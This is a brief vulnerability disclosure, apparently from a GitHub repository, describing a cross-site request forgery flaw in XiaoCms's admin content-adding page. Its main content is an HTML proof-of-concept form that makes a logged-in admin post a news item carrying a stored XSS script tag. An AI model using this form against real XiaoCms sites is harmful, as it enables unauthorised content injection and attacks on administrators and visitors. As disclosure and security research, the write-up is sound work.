# CSRF
------------------
CSRF can be used with XSS
Use the POC to create a news with XSS payload.

```
<html>
  <body>
    <form action="http://10.33.62.73:8080/admin/index.php?c=content&a=add&catid=3" method="POST">
      <input type="hidden" name="data[catid]" value="3" />
      <input type="hidden" name="data[title]" value="test" />
      <input type="hidden" name="data[thumb]" value="" />
      <input type="hidden" name="data[keywords]" value="" />
      <input type="hidden" name="data[description]" value="" />
      <input type="hidden" name="data[content]" value="<script>alert(1)</script>" />
      <input type="hidden" name="data[xiao_auto_description]" value="1" />
      <input type="hidden" name="data[xiao_auto_thumb]" value="1" />
      <input type="hidden" name="data[xiao_download_image]" value="1" />
      <input type="hidden" name="data[time]" value="2018-11-02+15:05:43" />
      <input type="hidden" name="data[hits]" value="" />
      <input type="hidden" name="submit" value="提交" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

![](https://github.com/AvaterXXX/XiaoCms/blob/master/image/CSRF_1.png)
